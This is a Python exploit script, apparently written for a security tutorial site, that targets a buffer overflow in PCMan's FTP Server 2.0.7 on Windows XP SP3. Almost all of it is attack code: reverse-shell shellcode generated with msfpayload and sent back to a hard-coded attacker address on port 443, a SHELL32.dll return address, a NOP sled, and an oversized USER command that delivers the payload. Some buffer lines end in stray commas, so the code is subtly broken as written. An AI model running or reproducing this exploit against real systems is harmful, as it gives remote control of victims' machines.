# Final PCMan's FTP Server v2.0.7 Exploit
# Written for NetSec.ws
 
import sys, socket, time
 
# Use in the form "python fuzzer.py  "
 
host = sys.argv[1] # Recieve IP from user
port = int(sys.argv[2]) # Recieve Port from user
 
#badchar '0x00, 0x0A, 0x0D'
#msfpayload windows/shell_reverse_tcp LHOST=192.168.137.132 LPORT=443 R | msfencode -b '\x00\x0a\x0d' -e x86/shikata_ga_nai 
#[*] x86/shikata_ga_nai succeeded with size 341 (iteration=1)
 
buf =  ""
buf += "\xbf\xc1\x2d\xe7\x9b\xda\xcf\xd9\x74\x24\xf4\x5b\x33\xc9\xb1\x49",
buf += "\x31\x7b\x12\x83\xeb\xfc\x03\xba\x23\x05\x6e\xc0\x56\x22\xdc\xd0",
buf += "\x5e\x4b\x20\xdf\xc1\x3f\xb3\x3b\x26\xcb\x09\x7f\xad\xb7\x94\x07",
buf += "\xb0\xa8\x1c\xb8\xaa\xbd\x7c\x66\xca\x2a\xcb\xed\xf8\x27\xcd\x1f",
buf += "\x31\xf8\x57\x73\xb6\x38\x13\x8c\x76\x72\xd1\x93\xba\x68\x1e\xa8",
buf += "\x6e\x4b\xf7\xbb\x6b\x18\x58\x67\x75\xf4\x01\xec\x79\x41\x45\xad",
buf += "\x9d\x54\xb2\x52\xb2\xdd\xcd\x38\xee\xfd\xac\x03\xdf\x26\x4a\x08",
buf += "\x63\xe9\x18\x4e\x68\x82\x6f\x52\xdd\x1f\xcf\x62\x43\x48\x5e\x3c",
buf += "\x75\x64\x0e\x3f\x5f\x12\xfc\xd9\x08\xe8\x30\x4d\xbe\x7d\x07\xd2",
buf += "\x14\x7d\xb7\x84\x5f\x6c\xc4\x6f\x30\x90\xe3\xd0\x39\x8b\x6a\x6f",
buf += "\xd4\x5c\x71\x3a\x4d\x5f\x8a\x14\xf9\x86\x7d\x61\x57\x6f\x81\x5f",
buf += "\xfb\xc3\x2e\x0c\xbf\xb0\x93\xe1\xc0\xe7\x7c\xc5\x97\x81\xfd\xa3",
buf += "\x8f\x90\x46\x4d\x03\x1a\x59\x04\xcb\xf0\x63\x8c\x6c\x5e\x6b\x06",
buf += "\x06\x70\xc2\xf3\x28\xa0\x82\x91\xb2\x27\x23\x06\x56\xc2\xe3\x91",
buf += "\x81\xde\x8d\xc6\xb8\x9a\x04\xea\x0c\xe3\xe4\x40\xfb\x6a\xf7\x6a",
buf += "\x46\x40\xf6\xd0\x6b\x17\x7c\xec\xd8\x8c\x2a\x64\x6d\x2d\x9f\x62",
buf += "\x6e\xa4\xc8\x75\x46\x1c\x5e\xdb\x36\xf2\x31\xb1\xb9\xa5\xe0\x10",
buf += "\xeb\xba\xd3\xf2\xa6\x9c\xd1\xcc\xea\xe1\x0c\xba\xf3\xe1\x86\xc5",
buf += "\xdc\x76\x0e\x40\x1b\xff\x2f\xc7\xa7\xff\x06\xd8\xdf\x03\x59\xf6",
buf += "\x48\x0c\x2c\xf2\xd7\xbf\xce\x2c\x18\xef";

# Return Address 0x7C9D30D7 in SHELL32.dll (Win XP SP3)
ret = '\xD7\x30\x9D\x7C' # Packed in little endian
 
# NOP Padding
nop = '\x90'*20
 
# EIP Writing Pattern
pattern = "A"*2000 + ret + nop + buf # Our exploit together. Junk -&gt; Return Address -&gt; NOPS -&gt; Shellcode
client = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # Declare a TCP socket
client.connect((host, port)) # Connect to user supplied port and IP address
client.recv(1024) # Recieve FTP Banner
client.send("USER " + pattern) # Send the user command with a variable length name
client.close() # Close the Connection
